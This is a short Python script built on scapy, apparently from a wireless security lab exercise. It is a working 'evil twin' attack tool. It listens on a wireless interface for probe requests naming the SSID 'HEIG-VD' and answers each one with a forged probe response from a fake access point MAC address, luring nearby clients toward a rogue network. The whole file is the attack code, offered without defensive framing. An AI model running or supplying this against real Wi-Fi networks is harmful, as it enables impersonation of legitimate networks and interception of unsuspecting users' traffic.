
from scapy.layers.dot11 import *

INTERFACE = "wlan0"             # Interface to use
AP_MAC = "11:22:33:44:55:66"    # MAC address of the fake access point
SSID = "HEIG-VD"                # Probe Requests to answer to

# Method to offer an evil twin for a particular SSID
def targeted_evil_twin(pkt):
    # Filter wifi probe requests
    if pkt.haslayer(Dot11ProbeReq):
        # Filter SSID of interest
        if pkt.getlayer(Dot11ProbeReq).info.decode() == SSID:
            # Get the MAC addresses of the probe request
            client_mac = pkt.getlayer(Dot11).addr2

            # Create a probe response
            probe_resp = Dot11(type=0, subtype=5, addr1=client_mac, addr2=AP_MAC, addr3=AP_MAC)

            # Create the SSID element
            ssid = Dot11Elt(ID="SSID", info=SSID, len=len(SSID))

            # Create the frame
            frame = RadioTap() / probe_resp / ssid

            # Send the frame
            sendp(frame, iface=INTERFACE, verbose=0)

if __name__ == '__main__':
    # Sniff network
    sniff(iface=INTERFACE, prn=targeted_evil_twin)

